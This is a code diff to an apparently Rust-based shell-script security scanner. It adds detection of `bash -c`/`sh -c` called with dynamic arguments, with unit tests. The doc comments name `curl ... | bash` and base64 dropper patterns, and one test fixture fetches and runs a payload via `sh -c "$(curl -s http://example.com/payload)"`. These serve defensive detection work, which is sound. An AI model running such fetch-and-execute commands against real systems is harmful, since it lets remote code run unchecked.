@@ -15,6 +15,9 @@
 //!   * Pipeline ending with `bash`/`sh`/`dash`/`zsh` — the classic
 //!     `curl ... | bash` or `echo payload | base64 -d | bash` dropper
 //!     pattern → DynamicExecution WARN.
+//!   * `bash -c <dynamic>` / `sh -c <dynamic>` — shell interpreter invoked
+//!     with `-c` and a variable or substitution argument, equivalent to eval
+//!     but avoiding the `eval` keyword → DynamicExecution CRITICAL.
 
 use std::path::Path;
 
@@ -115,6 +118,9 @@ fn check_command(
                 }
             }
         }
+        Some(n) if SHELL_INTERPRETERS.iter().any(|&s| s == n) => {
+            check_shell_c_flag(node, bytes, path, index, findings, n);
+        }
         _ => {}
     }
 }
@@ -212,6 +218,44 @@ fn emit_dynamic_source(
         confidence: 0.75,
         message: "`source` called with a dynamic path — sourcing a variable script path"
             .to_string(),
+        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
+        diff_introduced: false,
+    });
+}
+
+fn check_shell_c_flag(
+    cmd_node: Node,
+    bytes: &[u8],
+    path: &Path,
+    index: &LineIndex,
+    findings: &mut Vec<Finding>,
+    shell_name: &str,
+) {
+    let args = command_arguments(cmd_node);
+    let Some(c_pos) = args.iter().position(|a| node_text(*a, bytes) == "-c") else {
+        return;
+    };
+    let Some(cmd_arg) = args.get(c_pos + 1) else {
+        return;
+    };
+    if !is_dynamic_expression(*cmd_arg, bytes) {
+        return;
+    }
+    let off = cmd_node.start_byte();
+    let (line, col) = index.locate(off);
+    findings.push(Finding {
+        path: path.to_path_buf(),
+        byte_offset: off,
+        line,
+        col,
+        pass: PassKind::Ast,
+        kind: SignalKind::DynamicExecution,
+        severity: Severity::Critical,
+        confidence: 0.88,
+        message: format!(
+            "`{} -c` called with a dynamic string — equivalent to eval",
+            shell_name
+        ),
         snippet: redact_snippet(&snippet_around(bytes, off, 100)),
         diff_introduced: false,
     });
@@ -548,6 +592,41 @@ mod tests {
         assert!(findings
             .iter()
             .any(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn));
+    }
+
+    #[test]
+    fn shell_c_flag_with_variable_is_critical() {
+        let findings = run(b"bash -c \"$PAYLOAD\"\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicExecution)
+            .expect("expected DynamicExecution finding");
+        assert_eq!(hit.severity, Severity::Critical);
+        assert!(hit.message.contains("bash -c"));
+    }
+
+    #[test]
+    fn sh_c_flag_with_command_substitution_is_critical() {
+        let findings = run(b"sh -c \"$(curl -s http://example.com/payload)\"\n");
+        let hit = findings
+            .iter()
+            .find(|f| f.kind == SignalKind::DynamicExecution)
+            .expect("expected DynamicExecution finding");
+        assert_eq!(hit.severity, Severity::Critical);
+        assert!(hit.message.contains("sh -c"));
+    }
+
+    #[test]
+    fn shell_c_flag_with_literal_is_not_flagged() {
+        // `bash -c "literal string"` has no dynamic component — don't flag it.
+        let findings = run(b"bash -c \"echo hello\"\n");
+        assert!(
+            findings
+                .iter()
+                .all(|f| f.kind != SignalKind::DynamicExecution),
+            "bash -c with literal should not emit DynamicExecution, got: {:?}",
+            findings
+        );
     }
 
     #[test]
